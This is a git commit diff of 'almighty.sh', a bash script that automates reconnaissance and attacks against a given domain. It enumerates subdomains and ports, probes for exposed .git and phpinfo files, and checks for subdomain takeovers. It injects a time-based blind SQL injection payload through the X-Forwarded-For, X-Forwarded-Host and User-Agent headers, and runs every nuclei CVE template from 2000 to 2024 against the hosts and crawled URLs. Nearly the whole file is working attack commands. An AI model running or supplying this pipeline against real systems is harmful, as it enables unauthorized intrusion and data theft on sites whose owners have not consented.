e3dd4ebe4e998b8cf01a13dae3009a6a9986ff0c
Dhane Ashley Diabajo <dhaneashleyd@gmail.com>
2024-10-27 05:36:21 +0800

    Update almighty.sh

--- almighty.sh
+++ almighty.sh
@@ -3,7 +3,7 @@
 CYAN='\033[1;36m'
 RESET='\033[0m'
 GREEN='\033[0;32m'
-NUCLEI_COLOR='\033[0;34m'
+
 
 echo -e """${CYAN}
 ░█▀▀█ █░░ █▀▄▀█ ░▀░ █▀▀▀ █░░█ ▀▀█▀▀ █░░█ 
@@ -12,27 +12,21 @@ echo -e """${CYAN}
 
 echo -e "${GREEN}By Dhane Ashley Diabajo${RESET}"
 echo ""
-
 usage() {
-    echo "Usage: $0 -d <target_domain> [--skip-sn] [--skip-un] [--update]"
+    echo "Usage: $0 -d <target_domain> or $0 -update"
     exit 1
 }
 
-SKIP_SN=false
-SKIP_UN=false
-UPDATE_SCRIPT=false
+# Check for update flag
+if [[ "$1" == "-update" ]]; then
+    echo -e "${GREEN}Updating script from GitHub...${RESET}"
+    git pull origin main
+    exit 0
+fi
 
-while getopts ":d:-:" opt; do
+while getopts ":d:" opt; do
     case "${opt}" in
         d) TARGET_DOMAIN=${OPTARG} ;;
-        -)
-            case "${OPTARG}" in
-                skip-sn) SKIP_SN=true ;;
-                skip-un) SKIP_UN=true ;;
-                update) UPDATE_SCRIPT=true ;;
-                *) usage ;;
-            esac
-            ;;
         *) usage ;;
     esac
 done
@@ -41,42 +35,19 @@ if [ -z "${TARGET_DOMAIN}" ]; then
     usage
 fi
 
-# Check for updates if requested
-if [ "$UPDATE_SCRIPT" = true ]; then
-    if [ -d ".git" ]; then
-        echo -e "${CYAN}Checking for updates...${RESET}"
-        git fetch origin main
-        LOCAL=$(git rev-parse HEAD)
-        REMOTE=$(git rev-parse origin/main)
-        
-        if [ "$LOCAL" != "$REMOTE" ]; then
-            echo -e "${GREEN}Update available. Pulling latest version...${RESET}"
-            git pull origin main
-            echo -e "${CYAN}Script updated successfully! Please re-run the script.${RESET}"
-            exit 0
-        else
-            echo -e "${CYAN}Script is already up-to-date.${RESET}"
-            exit 0
-        fi
-    else
-        echo -e "${CYAN}This script is not in a Git repository, so it cannot be updated automatically.${RESET}"
-        exit 1
-    fi
-fi
-
 echo -e "${GREEN}Creating Subdomain Directory${RESET}"
 mkdir -p Subdomains
 echo -e "${CYAN}Complete${RESET}"
 
 echo -e "${GREEN}Running Subfinder, Anew, and Httpx...${RESET}"
-echo "${TARGET_DOMAIN}" | subfinder -recursive -active -silent | anew | httpx -silent >> Subdomains/subdomains.txt
+echo ${TARGET_DOMAIN} | subfinder -recursive -active -silent | anew | httpx -silent >> Subdomains/subdomains.txt
 echo -e "${CYAN}Complete${RESET}"
 
 echo -e "${GREEN}Running Httpx Scanning for sensitive files...${RESET}"
-declare -a paths=("/server-status" "/phpinfo.php" "/.DS_Store" "/.git")
-for path in "${paths[@]}"; do
-    cat Subdomains/subdomains.txt | httpx -silent -path "$path" -mc 200 -title > "Subdomains/httpx$(basename "$path").txt"
-done
+cat Subdomains/subdomains.txt | httpx -silent -path "/server-status" -mc 200 -title > Subdomains/httpx-Server-status.txt
+cat Subdomains/subdomains.txt | httpx -silent -path "/phpinfo.php" -mc 200 -title > Subdomains/httpx-phpinfo.txt
+cat Subdomains/subdomains.txt | httpx -silent -path "/.DS_Store" -mc 200 -title > Subdomains/httpx-DS_store.txt
+cat Subdomains/subdomains.txt | httpx -silent -path "/.git" -mc 200 -title > Subdomains/httpx-git.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
 echo -e "${GREEN}Running Httpx...${RESET}"
@@ -87,22 +58,38 @@ echo -e "${GREEN}Running Naabu...${RESET}"
 cat Subdomains/subdomains.txt | naabu -v --passive -silent > Subdomains/ports.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
-echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
-cat Subdomains/subdomains.txt | nuclei -silent -t /$HOME/nuclei-templates/http/takeovers/*.yaml > Subdomains/nuclei/nuclei-subover.txt
-echo -e "${CYAN}Task Completed!${RESET}"
-
 echo -e "${GREEN}Running Subzy and checking for subdomain takeovers...${RESET}"
 subzy run --targets Subdomains/subdomains.txt >> Subdomains/subzy.txt
 echo -e "${CYAN}Task Completed!${RESET}"
 
-declare -a headers=("X-Forwarded-For" "X-Forwarded-Host" "User-Agent")
-for header in "${headers[@]}"; do
-    echo -e "${GREEN}Running SQLi attack using $header...${RESET}"
-    cat Subdomains/subdomains.txt | httpx -silent -H "$header:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > "Subdomains/SQLi-$header.txt"
-    echo -e "${CYAN}Task Completed!${RESET}"
+echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
+cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-For.txt
+echo -e "${CYAN}Task Completed!${RESET}"
+
+echo -e "${GREEN}Running SQLi attack using X-Forwarded-Host...${RESET}"
+cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-Host:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-Host.txt
+echo -e "${CYAN}Task Completed!${RESET}"
+
+echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
+cat Subdomains/subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-User-Agent.txt
+echo -e "${CYAN}Task Completed!${RESET}"
+
+echo -e "${GREEN}Creating nuclei directory...${RESET}"
+mkdir -p Subdomains/nuclei
+echo -e "${CYAN}Task Completed!${RESET}"
+
+echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
+cat Subdomains/subdomains.txt | nuclei -silent -t /$HOME/nuclei-templates/http/takeovers/*.yaml > Subdomains/nuclei/nuclei-subover.txt
+echo -e "${CYAN}Task Completed!${RESET}"
+
+for year in {2000..2024}; do
+    echo -e "${GREEN}Running Nuclei template for year $year...${RESET}"
+    cat Subdomains/subdomains.txt | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$year/*.yaml > Subdomains/nuclei/nuclei-$year.txt
 done
 
 source /$HOME/venv/bin/activate
+
+mkdir -p urls
 
 echo -e "${GREEN}Running Katana${RESET}"
 echo "${TARGET_DOMAIN}" | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault > urls/katana.txt
@@ -149,18 +136,17 @@ done
 cat urls/final-clean.txt | gf sqli > urls/sqli.txt
 cat urls/final-clean.txt | gf redirect | egrep -iv "wp-" > urls/open-redirect.txt
 cat urls/final-clean.txt | gf ssrf > urls/ssrf.txt
+cat urls/final-clean.txt | gf rce > urls/rce.txt
+cat urls/final-clean.txt | gf lfi > urls/lfi.txt
+cat urls/final-clean.txt | gf interestingEXT > urls/interesting-extentions.txt
+cat urls/final-clean.txt | gf interestingparams > urls/interesting-params.txt
+cat urls/final-clean.txt | gf debug_logic > urls/debug-logic.txt
+cat urls/final-clean.txt | gf img-traversal > urls/img-traversal.txt
+cat urls/final-clean.txt | gf ssti > urls/ssti.txt
 
-# Place Nuclei logic after final-clean.txt generation
-if [ "$SKIP_UN" = false ]; then
-    echo -e "${GREEN}Creating URLs Nuclei directory...${RESET}"
-    mkdir -p urls/nuclei
-    echo -e "${CYAN}Task Completed!${RESET}"
-
-    for i in {2000..2024}; do
-        echo -e "${NUCLEI_COLOR}Running Nuclei template $i${RESET}"
-        cat urls/final-clean.txt | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$i/*.yaml > urls/nuclei/nuclei-$i.txt
-    done
-else
-    echo -e "${GREEN}Skipping Nuclei for URLs...${RESET}"
-fi
-echo -e "${GREEN}All tasks completed!${RESET}"
+mkdir urls/nuclei
+for i in {2000..2024}; do
+    echo -e "${GREEN}Running Nuclei template $i...${RESET}"
+    cat urls/final-clean.txt | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$i/*.yaml > urls/nuclei/nuclei-$i.txt
+done
+echo -e "${GREEN}Process complete!${RESET}"
